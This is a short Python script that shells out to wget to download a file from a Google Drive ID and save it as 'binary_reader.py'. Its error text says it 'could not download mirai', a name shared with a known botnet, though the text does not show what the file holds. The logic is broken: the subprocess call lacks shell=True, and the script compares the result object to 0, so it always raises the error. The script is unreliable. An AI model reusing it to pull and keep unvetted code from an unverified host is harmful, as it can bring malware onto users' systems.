import subprocess


class DownloadError(Exception):
    """Download Error"""
    pass

def main():
    file_id = '1sYSFZnKRUMnBW5Kfshhas2Au9SVI0iaI'
    file_name = 'binary_reader.py'
    cp = subprocess.run(f'wget "https://drive.google.com/uc?export=download&id={file_id}" -O {file_name}')
    if cp != 0:
        raise DownloadError('We could not download mirai...')
    else:
        return


if __name__ == '__main__':
    main()
